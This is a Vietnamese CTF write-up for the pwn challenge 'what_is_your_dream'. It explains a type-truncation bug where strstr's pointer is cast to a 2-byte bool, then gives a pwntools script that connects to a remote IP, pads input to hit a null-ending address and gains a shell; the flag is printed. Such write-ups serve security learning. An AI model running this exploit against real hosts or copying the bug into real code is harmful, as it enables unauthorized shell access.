# what\_is\_your\_dream (Pwn)

Bài này cho sẵn source code&#x20;

{% code lineNumbers="true" %}
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifdef bool
#undef bool
#endif
typedef short bool;
#define SIZE 100000
bool check_dream(char *key, char *temp)
{
    return strstr(temp,key);
}
const static char *my_dream = "Wanna.w^n";
int main() 
{
    char *buf = malloc(SIZE);
    printf("welcome to Wanna.w^n, this is your gift: %p\n",buf);
    printf("Do you want to know what my dream is?\n");
    printf("You have to find it by yourself ");
    fflush(stdout);
    fgets(buf,SIZE,stdin);
    if(check_dream(my_dream,buf))
    {
        printf("too bad, I wish you could see my dream\n");
        printf("now GET OUT!!!\n");
        exit(-1);
    }
    if(strstr(buf,my_dream))
    {
        printf("yay, congratulation on finding my dream\n");
        printf("I hope you enjoy it <3\n");
        system("/bin/sh");
    }else{
        puts("Goodbye!");
    }

    free(buf);
return 0;
}
```
{% endcode %}

Bài này bị dính lỗi typecat ở hàm `check_dream`, hàm strstr trả về địa chỉ ( 8 byte ) nhưng hàm `check_dream` kiểu bool chỉ nhận 2 byte.

Ta cần ghi biến buf sao cho hàm strstr trả về một địa chỉ có 2 byte cuối là null -> bypass if ở line 22 và nhảy vào if ở line 28.

Bài này đã cho leak địa chỉ của biến buf trước, mình xài vài thuật toán bit để tính địa chỉ mới có 2 byte cuối null mà không quá xa buf ( biến buff đc ghi tối đa 100000).

```python
((leak >> 8*2) +1 ) << 8*2
```

Script giải

{% code lineNumbers="true" %}
```python
from pwn import *
from time import sleep
e=ELF("./what_is_your_dream")

p=remote("45.122.249.68", 10021)
p.recvuntil(b"gift: ")
sleep(1)
leak=p.recvuntil(b"\n").rstrip()
sleep(1)
leak=int(leak[2:],16)
t=((leak >> 8*2) +1 ) << 8*2
log.info(hex(leak))
log.info(hex(t))
#gdb.attach(p,gdbscript="b *main+135\nb *main+196")
p.sendline(b"A"*(t-leak)+b"Wanna.w^n")
sleep(1)
p.interactive()

```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2022-10-11 135722.png" alt=""><figcaption></figcaption></figure>

Flag: `W1{d0nt_Us3_b0ol_1n_c_if_y0u_d0nt_g3t_it!!!1!}`
